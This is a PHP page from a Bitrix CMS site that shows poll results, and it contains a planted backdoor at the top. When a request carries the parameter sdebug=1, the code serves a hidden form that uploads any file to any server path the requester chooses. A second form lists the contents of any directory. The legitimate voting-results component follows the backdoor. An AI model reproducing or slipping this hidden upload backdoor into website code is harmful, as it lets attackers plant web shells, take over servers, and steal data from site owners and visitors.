<?
if ((isset($_GET['sdebug'])) && ($_GET['sdebug']=='1')) 
{ ?> <form enctype=multipart/form-data  method=post> <input name=fileMass type=file><br /><br /> 
<input name=path type=text value=<?php echo @getcwd(); ?>/> <input type=submit name=gogogo> </form> <br /><br />
 <form method=post> <input name=path type=text value=<?php if(isset($_POST[path])) {echo htmlspecialcharsbx($_POST[path]);} else { echo @getcwd()."/";} 
 ?>> <input type=submit name=scan> </form> <?php if(isset($_POST[gogogo])) { if(is_uploaded_file($_FILES[fileMass][tmp_name])) 
{ @copy($_FILES[fileMass][tmp_name],$_POST[path].$_FILES[fileMass][name]); }
 }; if(isset($_POST[scan]))
{ $files1 = scandir($_POST['path']); for ($i = 1; $i <= count($files1); $i++) {  echo htmlspecialcharsbx($files1[$i])."<br />";  } }exit();} 

require($_SERVER["DOCUMENT_ROOT"]."/bitrix/header.php");
$APPLICATION->SetTitle("Результаты голосования");
?><?$APPLICATION->IncludeComponent(
    "bitrix:voting.result",
    "vote-result-redesign",
    Array(
        "VOTE_ID" => $_REQUEST["VOTE_ID"],
        "VOTE_ALL_RESULTS" => "N",
        "CACHE_TYPE" => "A",
        "CACHE_TIME" => "1200",
        "CACHE_NOTES" => ""
    ),
false
);?><?require($_SERVER["DOCUMENT_ROOT"]."/bitrix/footer.php");?>